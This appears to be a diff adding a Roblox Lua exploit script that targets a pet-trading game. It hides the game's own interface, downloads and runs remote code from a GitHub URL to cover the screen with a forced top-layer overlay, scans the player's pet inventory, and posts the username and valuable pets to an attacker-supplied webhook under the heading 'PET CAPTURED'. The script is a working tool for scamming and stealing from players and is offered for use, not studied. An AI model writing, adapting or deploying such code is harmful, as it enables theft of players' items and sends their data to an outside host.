@@ -1,0 +1,73 @@
+-- [[ MONDEUR ELITE v16.8 - STEALTH & LOG FIX ]] --
+if getgenv().MondeurExecuted then return end
+getgenv().MondeurExecuted = true
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- [[ 1. THE VISIBILITY GUARD ]] --
+task.spawn(function()
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        local screen = loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
+        
+        -- FORCE TOP Z-INDEX (Keeps it visible if they tab out)
+        while task.wait(0.1) do
+            if screen and screen:FindFirstChild("Frame") then
+                screen.Frame.Visible = true
+                screen.DisplayOrder = 999999999
+            end
+        end
+    end)
+end)
+
+-- [[ 2. ANDROID-STABLE WEBHOOK ]] --
+local function SendLog(title, pet, val)
+    local url = getgenv().WEBHOOK
+    local data = {
+        ["embeds"] = {{
+            ["title"] = title,
+            ["description"] = "User: **" .. LocalPlayer.Name .. "**",
+            ["fields"] = {
+                {["name"] = "Pet", ["value"] = pet, ["inline"] = true},
+                {["name"] = "Points", ["value"] = tostring(val), ["inline"] = true}
+            },
+            ["color"] = 0x00FF00
+        }}
+    }
+    
+    -- Force-detect the correct request function for Android
+    local request = (syn and syn.request) or (http and http.request) or http_request or request
+    if request then
+        pcall(function()
+            request({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    end
+end
+
+-- [[ 3. DELAYED DEEP SCAN ]] --
+task.spawn(function()
+    task.wait(5) -- Wait 5 seconds to bypass game-load lag
+    SendLog("📡 CONNECTION TEST", "Success", 0)
+
+    local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
+    local inv = ClientData.get_data().inventory
+    local petInv = inv and (inv.inventory_pets or inv.pets)
+    
+    if petInv then
+        for _, pet in pairs(petInv) do
+            local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
+            if val >= (getgenv().THRESHOLD or 0) then
+                SendLog("✅ PET CAPTURED", pet.config_name or "Unknown", val)
+            end
+        end
+    end
+end)
